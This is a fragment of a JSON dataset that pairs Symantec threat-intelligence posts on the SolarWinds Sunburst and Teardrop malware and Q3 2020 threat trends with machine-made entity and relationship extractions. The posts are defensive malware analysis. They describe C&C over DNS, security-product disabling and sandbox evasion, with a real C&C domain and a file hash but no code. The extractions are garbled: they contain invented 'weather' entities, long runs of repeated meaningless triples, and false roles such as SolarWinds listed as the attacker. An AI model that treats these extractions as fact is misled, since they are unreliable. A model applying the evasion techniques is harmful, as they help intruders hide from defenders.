      "raw_output": "Named Entities: (Symantec, Company), (Broadcom, Company), (NASDAQ: AVGO, Stock Exchange), (Raindrop, Malware), (Teardrop, Malware), (Sunburst, Malware), (SolarWinds, Organization), (SolarWinds Orion, Product), (Sunny Skies, Weather), (Moderate Temperatures, Weather)\nRelationships: (Symantec, discovered, Raindrop), (Raindrop, uses, Cobalt Strike), (Raindrop, usedBy, Teardrop), (Raindrop, communicatedWith, Sunburst), (Raindrop, deployedOn, SolarWinds Orion), (Raindrop, containedIn, computer access), (Raindrop, executedOn, computer access), (Raindrop, linkedTo, Teardrop), (Raindrop, droppedAs, bproxy.dll), (Raindrop, associatedWith, SolarWinds Orion), (Raindrop, connectedTo, computer access), (Raindrop, launchedFrom, computer access), (Raindrop, exploited, computer access), (Raindrop, linkedTo, computer access), (Raindrop, usedBy, computer access), (Raindrop, linkedTo, computer access), (Raindrop, linkedTo, computer access), (Raindrop, linkedTo, computer access), (Raindrop, linkedTo, computer access), (Raindrop, linkedTo, computer access), (Raindrop, linkedTo, computer access), (Rain",
      "entities": [
        [
          "Symantec",
          "Company"
        ],
        [
          "Broadcom",
          "Company"
        ],
        [
          "NASDAQ: AVGO",
          "Stock Exchange"
        ],
        [
          "Raindrop",
          "Malware"
        ],
        [
          "Teardrop",
          "Malware"
        ],
        [
          "Sunburst",
          "Malware"
        ],
        [
          "SolarWinds",
          "Organization"
        ],
        [
          "SolarWinds Orion",
          "Product"
        ],
        [
          "Sunny Skies",
          "Weather"
        ],
        [
          "Moderate Temperatures",
          "Weather"
        ]
      ],
      "relationships": [
        [
          "Symantec",
          "discovered",
          "Raindrop"
        ],
        [
          "Raindrop",
          "uses",
          "Cobalt Strike"
        ],
        [
          "Raindrop",
          "usedBy",
          "Teardrop"
        ],
        [
          "Raindrop",
          "communicatedWith",
          "Sunburst"
        ],
        [
          "Raindrop",
          "deployedOn",
          "SolarWinds Orion"
        ],
        [
          "Raindrop",
          "containedIn",
          "computer access"
        ],
        [
          "Raindrop",
          "executedOn",
          "computer access"
        ],
        [
          "Raindrop",
          "linkedTo",
          "Teardrop"
        ],
        [
          "Raindrop",
          "droppedAs",
          "bproxy.dll"
        ],
        [
          "Raindrop",
          "associatedWith",
          "SolarWinds Orion"
        ],
        [
          "Raindrop",
          "connectedTo",
          "computer access"
        ],
        [
          "Raindrop",
          "launchedFrom",
          "computer access"
        ],
        [
          "Raindrop",
          "exploited",
          "computer access"
        ],
        [
          "Raindrop",
          "linkedTo",
          "computer access"
        ],
        [
          "Raindrop",
          "usedBy",
          "computer access"
        ],
        [
          "Raindrop",
          "linkedTo",
          "computer access"
        ],
        [
          "Raindrop",
          "linkedTo",
          "computer access"
        ],
        [
          "Raindrop",
          "linkedTo",
          "computer access"
        ],
        [
          "Raindrop",
          "linkedTo",
          "computer access"
        ],
        [
          "Raindrop",
          "linkedTo",
          "computer access"
        ],
        [
          "Raindrop",
          "linkedTo",
          "computer access"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 10,
    "relationship_count": 21
  },
  {
    "title": "solarwinds sunburst command control",
    "link": "https://www.security.com/threat-intelligence/solarwinds-sunburst-command-control",
    "content": "Inour most recent blog on the SolarWinds attacks, we examined the domain generation algorithm (DGA) used to initiate contact with the attackers’ command and control (C&C) servers. The control flow, what happens after that contact is made, is also noteworthy. The control flow of Sunburst varies depending on commands received from the attacker. However, the general control flow can be reconstructed in order to understand how communications would have progressed on machines that were of interest to the attackers. As described in our previous blog, two types of DNS requests are used for initial communications, and both receive DNS replies. The attackers use two fields in the DNS replies: “A records” for control flow and CNAME to hold data on a secondary C&C server. Normally, when querying DNS, a hostname string is provided to be translated into a numeric IP address, e.g., google.com may translate into 142.250.72.238. The IP address is held in the A record of the response. Sunburst parses the A record for IP addresses, but they are not used as IP addresses at all, but instead are actually triggers for different malware behavior. Instead of the attackers selecting random IP addresses to trigger different behaviors, they have selected IP address ranges belonging to Google, Amazon, and Microsoft. These are possibly chosen in order to reduce the chances of detection. Again, these IPs are not used as IP addresses in any way and the actual computer systems with these IP addresses are not contacted by the malware. The IP address value received in the DNS reply represents one of five behaviors depending on the current state: For a typical infection, Sunburst will first send to the C&C server the first 14 characters of the Windows domain name. This will continue for each 14 character chunk, until the entire Windows Domain name is sent. Next, the attackers will instruct Sunburst tosend the current security product statusesand then send information enabling Sunburst to launch a more robust secondary HTTP-based C&C. Within any DNS reply, the attackers can also instead instruct Sunburst to restore security product service registry keys that were previously disabled back to their believed default settings and quit or reset the internal state as if it is a fresh infection. In addition, to facilitate lab environment and sandbox avoidance, if the DNS requests result in a private range IP address, including 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 224.0.0.0/4, fc00::/7, fec0::/10, ff00::/8, Sunburst will also clean up and exit. Victims that were of interest to the attackers would have reached the secondary C&C stage. In this case, the DNS reply would contain a hostname in the CNAME record to be used as a HTTP C&C channel. The CNAME value is checked to see if it starts with http:// or https:// and is prepended with https:// otherwise. Next, Sunburst will perform repeated HTTP GET requests to receive commands, sleeping a variable amount of time between requests. The path portion of the URL always starts with /swip/upd/ followed by randomly selected URL patterns, in the following order. Optionally, one or more of the following: Optionally, followed by one of the following: If no previous string has been selected, one of the following or optionally, one of the following if a previous string has been selected: Optionally, followed by: Also, if the first character in the path is a dot (.), the dot is removed. For example, the following are example URLs that could be used: The final digit before the .xml extension is not a random character, but represents the return code for previous command requests – typically 0 means success and 1 or other values mean error. For the first 16 requests, a different randomly generated path is used each time, but after that it may repeat random generations that it used previously. If data is being sent to the attacker as a result of a command (e.g. sending system information), the path construction will be different and will be covered in a future blog. Sunburst also adds the custom header “If-None-Match:” set to thepreviously described 8-byte useridXOR’d by a randomly generated 8-byte sequence that is appended and then converted into lowercase ASCII hex. After the HTTP GET request is made, Sunburst checks for a valid response from the attacker. The response uses steganography and is a faux, but convincing XML page of data, where only certain fields are utilized by Sunburst. The faux XML data is searched for a sequence of: These sequences are concatenated together with non-hexadecimal characters removed. The first DWORD (4 bytes) of the sequence represents the size of the remaining data, which is validated and then the next byte is an XOR key. The rest of the data is then XOR decrypted by the key byte and then decompressed. After being decompressed, the first character is a number that specifies the action to perform followed by the number of included arguments in the following data for the command: The command number can instruct Sunburst to perform the following behaviors: If no data needs to be sent to the attacker, the above GET request with the return code encoded in the URL filename is sent. If data needs to be sent to the attacker as a result of these commands (e.g. sending system information), the data will be included in the next regular HTTP(S) communication as a POST request or a HEAD request if some error occurred where the data is missing. Details on each of these behaviors and how data is uploaded to the attacker will be covered in an upcoming blog. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (SolarWinds, Attacker), (Sunburst, Threat Type), (DNS request, Technique), (google.com, Domain), (Amazon, Domain), (Microsoft, Domain), (IP address range, Vulnerability)\nRelationships: (SolarWinds, uses, Sunburst), (SolarWinds, uses, DNS request), (google.com, resolvesTo, IP address range), (Amazon, resolvesTo, IP address range), (Microsoft, resolvesTo, IP address range)",
      "entities": [
        [
          "SolarWinds",
          "Attacker"
        ],
        [
          "Sunburst",
          "Threat Type"
        ],
        [
          "DNS request",
          "Technique"
        ],
        [
          "google.com",
          "Domain"
        ],
        [
          "Amazon",
          "Domain"
        ],
        [
          "Microsoft",
          "Domain"
        ],
        [
          "IP address range",
          "Vulnerability"
        ]
      ],
      "relationships": [
        [
          "SolarWinds",
          "uses",
          "Sunburst"
        ],
        [
          "SolarWinds",
          "uses",
          "DNS request"
        ],
        [
          "google.com",
          "resolvesTo",
          "IP address range"
        ],
        [
          "Amazon",
          "resolvesTo",
          "IP address range"
        ],
        [
          "Microsoft",
          "resolvesTo",
          "IP address range"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 5
  },
  {
    "title": "solarwinds unique dga",
    "link": "https://www.security.com/threat-intelligence/solarwinds-unique-dga",
    "content": "In the weeks sincenews of the SolarWinds attacks broke, we’ve continued our analysis into the tools used by the attackers. One of the most interesting things we’ve seen is the way the attackers configured their malware in order to contact a command and control (C&C) server via DNS communications. It’s a technique that is rarely used, but there have been some reports of other APT groups such as Crambus (aka Oilrig) using it previously. Sunburst (Backdoor.Sunburst), the malware which was used to Trojanize the SolarWinds Orion software, uses a domain generation algorithm (DGA) to generate domain names to contact for C&C purposes. However, unlike most DGAs, this DGA does not just randomly generate characters. Instead, information is encoded into the text that makes up the generated domain names. By doing so, initial C&C actually happens via DNS, which provides a stealthier level of communications. For each infected computer, Sunburst generates a unique ID, referred to as a userid. The userid is made up of the first active MAC address that is not the loopback address, concatenated with the Windows Domain name of the computer, and then concatenated with the Windows installation UUID, a randomly generated value at Windows installation time stored in HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid. These three values are then MD5 hashed and the first 64 bits are XOR’d with the last 64 bits, resulting in a unique 64-bit userid. Because multiple DNS requests will have to be made to transmit all payload information, the attackers require a unique ID to know from which computer the information is coming from. DNS is a distributed protocol, meaning the infected computer does not contact the attacker’s C&C server directly, but instead the DNS request is passed through multiple intermediaries before reaching the attacker DNS server. Only by including the userid within the DNS request will the attackers be able to combine the multiple requests. The DNS lookup will be in one of the following forms: <encoded information>.appsync-api.eu-west-1.avsvmcloud.com <encoded information>.appsync-api.us-west-2.avsvmcloud.com <encoded information>.appsync-api.us-east-1.avsvmcloud.com <encoded information>.appsync-api.us-east-2.avsvmcloud.com The encoded information will be in one of two forms providing the attackers either the Windows domain name of the infected organization or security product statuses and feedback on the infected machine. Initially, after Sunburstchecks for or bypasses security tools and products, the first DNS lookup will occur containing the infected computer’s Windows domain name or a portion thereof, encoded into the C&C domain. The Windows domain is usually a human-readable string representing the name of the organization the machine belongs to, e.g. AcmeA1Corp. The DGA will start by prepending the aforementioned userid with a randomly chosen key byte between 0x81 and 0xFE followed by the userid XOR’d with the key byte. These nine bytes are then encoded in a fashion similar to Base64, resulting in 15 characters. This string of characters is then followed by the Windows domain name, encoded. Because Windows domain names can be up to 253 characters long, Sunburst chooses to segment the Windows domain names into 14 character chunks preceded by the chunk number (where the first chunk number is 0). Windows domain names longer than 14 characters will thus require more than one DNS lookup to provide the entire Windows domain name. Sunburst will also resend previously sent chunks if an error was encountered or, under certain error conditions, set the chunk number to a negative one. The segment chunk number and the Windows domain name are both encoded separately and appended to the encoded userid. These elements form the subdomain of the domain. This domain is queried via DNS, which results in this encoded information reaching the attacker’s DNS server. The attacker can then decode the information and reply with further instructions, which will be covered in a future blog. Sunburst does not automatically generate multiple DNS queries in order to send the entire Windows domain name. Whether Sunburst will send the remaining 14-character segments depends on the response received from the initial DNS query. Because Sunburst was delivered via a supply chain attack, many systems that are not of interest will be infected. By encoding the first 14 characters of the Windows domain name into the first DNS query, the attackers are able to triage infections and only mount second-state attacks on systems of interest - those that have Windows domain names that match organizations they wish to target. Depending on the response to the first DNS lookup, a second DNS lookup may occur that encodes the status of installed security products on the system and information on whether the DNS communication has been successful. First, the userid is XOR’d by the third and second bytes of a timestamp value described below in an alternating fashion before being XOR’d by a randomly chosen key byte between 0x01 and 0x7E that is then prepended to the userid. The first byte thus provides not only the key byte, but informs the attackers if the remaining content will contain the Windows domain name payload (key byte is between 0x81 and 0xFE) or the security product status and feedback payload (key byte is between 0x01 and 0x7E). After the userid, a nibble (half a byte) is used to specify if the security payload information has content (nibble is set to 2) or is blank (nibble is set to 1). This is followed by a timestamp in UTC of when the DNS query was sent, granular to 30-minute increments. The last bit of the timestamp is set to a bit flag representing whether the previous DNS response successfully contained partial or full instructions to start the secondary HTTP communication channel. This may have been designed by the attackers as a feedback mechanism to ensure the DNS communication mechanism is working before sending the full HTTP communication channel details and, in the case of full details, a signal that the HTTP communication should have already started. After the timestamp, the security product status payload is optionally provided if select security product services were found as running. The two bytes contain a bitmask that encodes information on whether any of the following security products were not found, or found running and/or subsequently disabled and stopped: The userid, timestamp, feedback bit, and optional security product data are then encoded into text as the subdomain of a DNS query that is sent to the attackers. The responses to these DNS queries may then contain control information for the threat to terminate or launch a secondary HTTP communication channel, something that we plan to cover in a subsequent blog. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (SolarWinds, Threat Type), (Malware, Malware), (command-and-control, Technique), (DNS, Protocol), (C&C, Technique), (Domain Generation Algorithm, Technique), (DGA, Technique), (Oilrig, Attacker), (Sunburst, Malware), (userid, File), (Windows Domain, Entity), (Windows installation UUID, Entity), (HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid, Entity), (MAC address, Entity), (hash, Hash)\nRelationships: (SolarWinds, uses, Malware), (SolarWinds, uses, command-and-control), (SolarWinds, uses, DNS), (SolarWinds, uses, C&C), (SolarWinds, uses, Domain Generation Algorithm), (SolarWinds, uses, DGA), (SolarWinds, uses, Oilrig), (SolarWinds, uses, Sunburst), (SolarWinds, uses, userid), (SolarWinds, uses, Windows Domain), (SolarWinds, uses, Windows installation UUID), (SolarWinds, uses, HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid), (SolarWinds, uses, MAC address), (SolarWinds, uses, hash), (SolarWinds, uses, xor), (SolarWinds, uses, Windows installation UUID), (SolarWinds, uses, MachineGuid), (SolarWinds, uses, Windows installation UUID),",
      "entities": [
        [
          "SolarWinds",
          "Threat Type"
        ],
        [
          "Malware",
          "Malware"
        ],
        [
          "command-and-control",
          "Technique"
        ],
        [
          "DNS",
          "Protocol"
        ],
        [
          "C&C",
          "Technique"
        ],
        [
          "Domain Generation Algorithm",
          "Technique"
        ],
        [
          "DGA",
          "Technique"
        ],
        [
          "Oilrig",
          "Attacker"
        ],
        [
          "Sunburst",
          "Malware"
        ],
        [
          "userid",
          "File"
        ],
        [
          "Windows Domain",
          "Entity"
        ],
        [
          "Windows installation UUID",
          "Entity"
        ],
        [
          "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid",
          "Entity"
        ],
        [
          "MAC address",
          "Entity"
        ],
        [
          "hash",
          "Hash"
        ]
      ],
      "relationships": [
        [
          "SolarWinds",
          "uses",
          "Malware"
        ],
        [
          "SolarWinds",
          "uses",
          "command-and-control"
        ],
        [
          "SolarWinds",
          "uses",
          "DNS"
        ],
        [
          "SolarWinds",
          "uses",
          "C&C"
        ],
        [
          "SolarWinds",
          "uses",
          "Domain Generation Algorithm"
        ],
        [
          "SolarWinds",
          "uses",
          "DGA"
        ],
        [
          "SolarWinds",
          "uses",
          "Oilrig"
        ],
        [
          "SolarWinds",
          "uses",
          "Sunburst"
        ],
        [
          "SolarWinds",
          "uses",
          "userid"
        ],
        [
          "SolarWinds",
          "uses",
          "Windows Domain"
        ],
        [
          "SolarWinds",
          "uses",
          "Windows installation UUID"
        ],
        [
          "SolarWinds",
          "uses",
          "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid"
        ],
        [
          "SolarWinds",
          "uses",
          "MAC address"
        ],
        [
          "SolarWinds",
          "uses",
          "hash"
        ],
        [
          "SolarWinds",
          "uses",
          "xor"
        ],
        [
          "SolarWinds",
          "uses",
          "Windows installation UUID"
        ],
        [
          "SolarWinds",
          "uses",
          "MachineGuid"
        ],
        [
          "SolarWinds",
          "uses",
          "Windows installation UUID"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 15,
    "relationship_count": 18
  },
  {
    "title": "solarwinds attacks stealthy attackers attempted evade detection",
    "link": "https://www.security.com/threat-intelligence/solarwinds-attacks-stealthy-attackers-attempted-evade-detection",
    "content": "As we continue our analysis on the tools used inthe SolarWinds attacks, one of the most striking aspects we’ve noticed is how careful the attackers were to avoid drawing attention to themselves. Software supply chain attacks are relatively stealthy to begin with, since signed software from a trusted source is less likely to raise red flags. However, the attackers weren’t content to rely on the cover this provided and also took several other steps to avoid detection. To begin with, the Sunburst backdoor (Backdoor.Sunburst), which was delivered using a Trojanized update to SolarWinds Orion, sets a delay time of up to 14 days before execution. In other words, no malicious activity will begin until this period has elapsed. The length of time selected is most likely to increase the likelihood that the log entries of the initial malicious activity have been deleted before any subsequent post-breach activity is initiated, thereby making it difficult to correlate the two sets of malicious events. Many organizations, including even managed security services providers (MSSPs), will often purge their security logs after seven days to minimize storage costs and make searching them easier. Sunburst will also check the current Windows domain the machine belongs to. If the domain contains the string 'test' or one of 13 additional specific domains that appear related to lab systems such as “swdev.local” and “apac.lab”, the threat will cease to execute.  A full list is in Appendix A. Attacks begin with a Trojanized version of SolarWinds’ Orion software. The attackers modified Orion in order to deliver the Sunburst backdoor to the computer. Sunburst is first stage malware, designed to perform reconnaissance on the infected computer, perform checks for security tools, and deliver a second stage payload, if required. The main Sunburst code is contained in a class named SolarWindows.Orion.Core.BusinessLayer that, when first instantiated, calls a member function called Update. The function name is a ruse, as the code does not perform any update, but instead is designed to disable security software, avoid security researcher systems, and possibly avoid running on systems not of interest to the attackers. The function contains three lists – a list of process names, a list of driver filenames, and a list of processes and service name pairs. These names are all obfuscated in the code by hashing them using the FNV1A algorithm and using variable names that masquerade as timestamps. This process and driver list contains tools that commonly run on security researcher systems and thus, this functionality appears to be designed not to run on such systems in order to avoid discovery. The full list of security tools can be found in Appendix A. Furthermore, the lists also contained names related to a variety of security software programs including: The security vendors on this list have most likely been chosen as the attacker has determined that their products are unlikely be installed at organizations of interest to the attackers. Given the indiscriminate nature of supply chain as a vector, with an estimated 18,000 SolarWinds customers affected, the attackers probably wanted to avoid any risk of detection in organizations that weren’t of interest to them. Interestingly, the process solarwindsdiagnostics is also blacklisted. Presumably this is included to avoid detection during any SolarWinds testing or troubleshooting. Sunburst also attempts to specifically disable some software security services via the registry. This allows Sunburst to perform its malicious actions completely undetected. If the attackers worked quickly and restored the services afterwards, a security administrator would potentially have no record of the activity, nor have even noticed the temporary lack of protection. Figure 1. Example of how Sunburst disables security software. In this case it checks if the CrowdStrike processes csfalconservice or csfalconcontainer are running, and if so, it sets the csagent, csfalconservice, and csdevicecontrol services to be disabled. To disable the security software, Sunburst will simply set the products’ service start setting to Disabled. In Windows, this is done by setting the registry keys: This will cause the security software not to load at the next reboot. It should be noted that the attackers do not attempt to disable any Symantec products. Presumably this is because of an anti-tampering feature in Symantec software, which prevents its own service from being disabled. The process and services pair list include software from the following vendors: Interestingly, the list also included Microsoft Defender, but only the service key permissions are changed.  Currently, this has an unknown effect. In addition, some other unknown products are also included, but were effectively commented out. The attackers may have discovered this technique was ineffective for these products. Finally, Sunburst will check if api.solarwinds.com resolves to a valid address before continuing. The SolarWinds attacks are among the best-planned and adept attacks we have seen in recent years. The attackers have gone to great lengths to both find an effective path into their targeted organizations and, once inside their networks, maintain a low profile. Our analysis of these tools is ongoing and we plan to publish further blogs in the coming weeks. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (SolarWinds, Tool), (Sunburst, Malware), (Backdoor.Sunburst, Malware), (Trojanized update, Tool), (SolarWinds Orion, Tool), (test, Domain), (swdev.local, Domain), (apac.lab, Domain), (Appendix A, Document)\\nRelationships: (SolarWinds, uses, Sunburst), (SolarWinds, uses, Trojanized update), (SolarWinds Orion, provides, Backdoor.Sunburst), (SolarWinds Orion, provides, Trojanized update), (SolarWinds Orion, provides, test), (SolarWinds Orion, provides, swdev.local), (SolarWinds Orion, provides, apac.lab)",
      "entities": [
        [
          "SolarWinds",
          "Tool"
        ],
        [
          "Sunburst",
          "Malware"
        ],
        [
          "Backdoor.Sunburst",
          "Malware"
        ],
        [
          "Trojanized update",
          "Tool"
        ],
        [
          "SolarWinds Orion",
          "Tool"
        ],
        [
          "test",
          "Domain"
        ],
        [
          "swdev.local",
          "Domain"
        ],
        [
          "apac.lab",
          "Domain"
        ],
        [
          "Appendix A",
          "Document"
        ],
        [
          "SolarWinds",
          "uses",
          "Sunburst"
        ],
        [
          "SolarWinds",
          "uses",
          "Trojanized update"
        ],
        [
          "SolarWinds Orion",
          "provides",
          "Backdoor.Sunburst"
        ],
        [
          "SolarWinds Orion",
          "provides",
          "Trojanized update"
        ],
        [
          "SolarWinds Orion",
          "provides",
          "test"
        ],
        [
          "SolarWinds Orion",
          "provides",
          "swdev.local"
        ],
        [
          "SolarWinds Orion",
          "provides",
          "apac.lab"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 16,
    "relationship_count": 0
  },
  {
    "title": "threat landscape trends q3 2020",
    "link": "https://www.security.com/threat-intelligence/threat-landscape-trends-q3-2020",
    "content": "We took a look through telemetry from our vast range of data sources and selected some of the trends that stood out from July, August, and September 2020 From significant increases in Emotet and Cobalt Strike activity to a spike in the number of server vulnerability exploit attempts, let’s take a quick look at the trends that shaped the cyber security threat landscape in the third quarter of 2020. Malware attacks have continued to increase quarter over quarter in 2020. In July, August, and September, Symantec, a division of Broadcom (NASDAQ: AVGO), blocked over 78 million malware infection attempts, which represents an almost 30% increase over Q2 and a 127% increase over the number blocked in Q1. The increase in activity may have been spurred by many countries exiting COVID-19 lockdowns, with a resurgence in business activity presenting more opportunities for cyber criminals. Malware that downloads files, which are often malicious, saw an increase in Q3. Symantec blocked 17% more of these threats in Q3 than in Q2. Attacks involving the use of the multipurpose commodity malware Cobalt Strike (Backdoor.Cobalt), have continued to increase. Detections of attacks involving the use of this threat increased 57% from August to September alone. The quarter on quarter trend is even more alarming, with a 163% increase seen when comparing Q1 2019 to Q3 2020. In many cases, Cobalt Strike is blocked by other detection technologies and signatures, meaning the true number of attacks involving this malware may be significantly higher. The Lokibot information-stealing malware (Infostealer.Lokibot) saw a 237% increase in activity from Q2 to Q3 2020. Lokibot is one of today’s most prevalent information-stealing threats and is often distributed via spam campaigns. Blocked Lokibot attacks in September reached the highest number seen since June 2019. As predicted towards the end of June, after over a year of subdued activity, the Emotet botnet (Trojan.Emotet), a known malware distribution platform, has returned in Q3. Following a dramatic drop in activity in Q2 2019 the malware looks to be steadily ramping up activity, with the number of blocked infection attempts in Q3 up 44% over that of Q1. The vast majority of Emotet infection attempts are blocked by email protection products, meaning antivirus detections are a small, representative sample of blocked Emotet activity. Looking at the numbers by month, there was a significant jump in activity from June to September, equating to a 353% increase. The vast majority of these blocked Emotet attacks occurred in the U.S. Symantec observed and blocked an Emotet spam campaign in September which was using COVID-19 themed lures. This campaign contributed to the surge in activity seen in September. For additional information on Emotet, read our blog: The Evolution of Emotet: From Banking Trojan to Threat Distributor Spam emails using COVID-19 themed lures have increased month-on-month in Q3, with a roughly 27% increase in the number of these emails blocked by Symantec each month. As mentioned, Symantec observed and blocked an Emotet spam campaign in September which was using COVID-19 themed lures. In Q3, the number of phishing attempts blocked by Symantec’s Intrusion Prevention System (IPS) technology increased 25% over the previous quarter, and almost doubled (97%) over numbers from Q1 2020. The number of server vulnerability exploit attempts blocked by Symantec IPS technology in Q3 increased by 77% over the previous quarter. This increase in exploit attempts follows a series of critical server vulnerability disclosures, such as the “Zerologon” flaw in Windows Server (CVE-2020-1472) and a vulnerability in Pulse Secure VPN servers (CVE-2019-11510). These types of vulnerabilities are tempting for hackers as they can offer access to enterprise servers and all the sensitive data stored there. Servers are also an ideal platform for launching further attacks. The average number of attacks against Symantec Internet of Things (IoT) honeypots* per day was down 8% in Q3 compared to Q2 2020. *Symantec IoT honeypots emulate protocols used by virtually all IoT devices, such as routers, connected cameras, digital video recorders, and so on. While the number of attacks decreased, the number of unique IP addresses performing IoT attacks increased in Q3, up 18% over the previous quarter. This suggests that the botnets carrying out the attacks are increasing in size. The top ten user names and passwords used in attacks on IoT devices. Most of the credentials used by attackers are default or easily guessable. The largest number of attacks originated from IP addresses located in the U.S. with 25% of attacks emanating from here. However, the number of attacks originating in the U.S. decreased in Q3, down from 34% the previous quarter. The second highest number of attacks originated in Vietnam, followed by China, India, and Taiwan. Since attacks are carried out by botnets of infected IoT devices, these regions have the highest number of infected IoT devices. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Emotet, Malware), (Cobalt Strike, Malware), (Symantec, Company), (NASDAQ: AVGO, Stock Exchange), (Q2, Quarter), (Q1, Quarter), (July, Month), (August, Month), (September, Month), (Malware, Malware), (multipurpose commodity malware, Malware), (Backdoor.Cobalt, Malware), (Detections, Metric), (attacks, Threat), (other detection technologies and signatures, Tool), (true number of attacks involving, Relationship)\nRelationships: (Emotet, uses, Malware), (Cobalt Strike, uses, Malware), (Symantec, blocks, Malware), (Q2, comparedTo, Q1), (Q1, comparedTo, Q2), (July, comparedTo, August), (August, comparedTo, September), (Malware, downloads, File), (Malware, isMalicious, True), (backdoor.Cobalt, uses, Malware), (attacks involving backdoor.Cobalt, detected, Detections), (attacks involving backdoor.Cobalt, increased, 57%), (Q3, comparedTo, Q2), (Q3, comparedTo, Q1), (Q3, comparedTo, Q1), (Q3, comparedTo, Q3), (Q3, comparedTo, Q3)",
      "entities": [
        [
          "Emotet",
          "Malware"
        ],
        [
          "Cobalt Strike",
          "Malware"
        ],
        [
          "Symantec",
          "Company"
        ],
        [
          "NASDAQ: AVGO",
          "Stock Exchange"
        ],
        [
          "Q2",
          "Quarter"
        ],
        [
          "Q1",
          "Quarter"
        ],
        [
          "July",
          "Month"
        ],
        [
          "August",
          "Month"
        ],
        [
          "September",
          "Month"
        ],
        [
          "Malware",
          "Malware"
        ],
        [
          "multipurpose commodity malware",
          "Malware"
        ],
        [
          "Backdoor.Cobalt",
          "Malware"
        ],
        [
          "Detections",
          "Metric"
        ],
        [
          "attacks",
          "Threat"
        ],
        [
          "other detection technologies and signatures",
          "Tool"
        ],
        [
          "true number of attacks involving",
          "Relationship"
        ]
      ],
      "relationships": [
        [
          "Emotet",
          "uses",
          "Malware"
        ],
        [
          "Cobalt Strike",
          "uses",
          "Malware"
        ],
        [
          "Symantec",
          "blocks",
          "Malware"
        ],
        [
          "Q2",
          "comparedTo",
          "Q1"
        ],
        [
          "Q1",
          "comparedTo",
          "Q2"
        ],
        [
          "July",
          "comparedTo",
          "August"
        ],
        [
          "August",
          "comparedTo",
          "September"
        ],
        [
          "Malware",
          "downloads",
          "File"
        ],
        [
          "Malware",
          "isMalicious",
          "True"
        ],
        [
          "backdoor.Cobalt",
          "uses",
          "Malware"
        ],
        [
          "attacks involving backdoor.Cobalt",
          "detected",
          "Detections"
        ],
        [
          "attacks involving backdoor.Cobalt",
          "increased",
          "57%"
        ],
        [
          "Q3",
          "comparedTo",
          "Q2"
        ],
        [
          "Q3",
          "comparedTo",
          "Q1"
        ],
        [
          "Q3",
          "comparedTo",
          "Q1"
        ],
        [
          "Q3",
          "comparedTo",
          "Q3"
        ],
        [
          "Q3",
          "comparedTo",
          "Q3"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 16,
    "relationship_count": 17
  },
  {
    "title": "sunburst supply chain attack solarwinds",
    "link": "https://www.security.com/threat-intelligence/sunburst-supply-chain-attack-solarwinds",
    "content": "UPDATE December 16 2020:Our blog has been updated with analysis of the Teardrop second-stage malware and an example of the post-compromise attack chain. We have also provided clarification on the use of Symantec’s name in a certificate used to sign the SolarWinds software. Thousands of organizations have been affected by a supply chain attack that compromised the update mechanism for SolarWinds Orion software in order to deliver a backdoor Trojan known as Sunburst (Backdoor.Sunburst) (aka Solorigate). Details on the attacks were disclosed yesterday(December 13) by the security firm FireEye. SolarWinds has alsopublished a security advisory for its customers. The campaign has been underway since at least March 2020. Any Orion user who downloaded an update in this period is likely to have been infected with Sunburst. According to FireEye, the attackers conducted further malicious activity on a subset of victim organizations that were of interest to them. By their nature, supply chain attacks are indiscriminate and will infect any user of the compromised software. They are carried out in order to provide the attacker with access to a large number of organizations, a subset of which will be identified as targets of interest for further compromise. The Trojanized software was signed by a certificate marked as being issued by Symantec. Symantec sold its certificate authority business to Digicert in 2018. The certificate in question was a legacy certificate still using the Symantec brand name. Symantec has contacted Digicert, which has confirmed that it is investigating the issue. Symantec has identified more than 2,000 computers at over 100 customers that received Trojanized software updates. We have found a small number of organizations where a second stage payload (Backdoor.Teardrop) was used. An existing SolarWinds DLL called SolarWinds.Orion.Core.BusinessLayer.dll was modified by the attackers to include an added class. The malware is designed to remain inactive for a period after installation. It will then attempt to resolve a subdomain of avsvmcloud[.]com. The DNS response will deliver a CNAME record that directs to a command and control (C&C) domain. In SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInterval() code is added to call OrionImprovementBusinessLayer.Initialize(). OrionImprovementBusinessLayer is a malicious class added by the attacker. It has the following functionality: A second stage payload, a backdoor called Teardrop, is deployed against a targets of interest to the attackers. Symantec has observed two variants of Teardrop, both of which behave similarly and are used to deliver a further payload – the Cobalt Strike commodity malware. The first variant (SHA256: b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07) is a DLL. The malicious code is contained in the export Tk_CreateImageType, ordinal 209. When executed, that malicious code reads a file named upbeat_anxiety.jpg from the current directory and ensures it has a jpg header. It will also check that the registry key HKCU\\Software\\Microsoft\\CTF exists. An embedded copy of Cobalt 